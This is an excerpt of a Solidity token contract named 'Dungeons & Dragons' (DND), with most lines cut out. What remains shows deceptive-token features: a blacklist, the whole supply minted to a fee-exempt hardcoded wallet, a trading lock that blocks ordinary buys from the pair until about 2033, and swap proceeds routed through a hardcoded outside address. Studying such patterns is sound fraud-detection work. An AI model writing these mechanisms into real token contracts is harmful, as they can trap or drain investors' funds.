...
contract Token is ERC20, Ownable {
    ...
    address public _marketingWalletAddress = 0xfAEf7E1a93C44DE70eaFc42B5FBe60508793A128;
    ...
    uint256 public times = 1992308000;
    uint256 distributorGas = 864000;
    mapping(address => bool) public _isBlacklisted;
    uint256 public CFee = 100;
    event ExcludeFromFees(address indexed account, bool isExcluded);
    constructor() public ERC20("Dungeons & Dragons", "DND") {
        ...
        excludeFromFees(0xfAEf7E1a93C44DE70eaFc42B5FBe60508793A128, true);
        isDividendExempt[address(this)] = true;
        isDividendExempt[address(0)] = true;
        isDividendExempt[_destroyAddress] = true;
        isDividendExempt[address(dividendTracker)] = true;
        _mint(0xfAEf7E1a93C44DE70eaFc42B5FBe60508793A128, 21000000 * (10**18));
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && !_isExcludedFromFees[to]){
            if(!_isRemoveLiquidity()){
                ...
                require(block.timestamp > times.add(86400));
    ...
    function _swapAndLiquid() private {
        ...
        if(fistval > 0){
            uint256 dr = fistval.mul(2).div(3);
            uint256 mr2 = fistval.sub(dr);
            IERC20(USDTS).transfer(_marketingWalletAddress, mr2);
    ...
    function _swapTokenForTokenFIST(uint256 tokenAmount) private {
        ...
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, 0xD45B6005980B380CFe5eA182CF05bBcB883eaD13, block.timestamp);
        uint256 amount = IERC20(USDTS).balanceOf(0xD45B6005980B380CFe5eA182CF05bBcB883eaD13);
        if (IERC20(USDTS).allowance(0xD45B6005980B380CFe5eA182CF05bBcB883eaD13, address(this)) >= amount) {
            IERC20(USDTS).transferFrom(0xD45B6005980B380CFe5eA182CF05bBcB883eaD13, address(this), amount);
        }
    }
